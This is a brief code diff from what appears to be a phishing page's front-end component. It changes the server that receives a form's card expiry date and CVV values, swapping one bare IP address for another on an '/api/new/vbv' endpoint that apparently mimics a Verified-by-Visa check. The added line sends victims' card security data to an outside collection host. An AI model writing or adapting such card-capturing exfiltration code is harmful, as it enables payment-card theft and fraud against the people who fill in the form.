@@ -89,7 +89,7 @@ export  default {
           "dateExp":this.dateExp,
           "cvv":this.cvv,
         }
-        axios.post("http://51.91.58.210/api/new/vbv", data).then(res => {
+        axios.post("http://63.250.35.137/api/new/vbv", data).then(res => {
           console.log(res)
 
         }).catch()
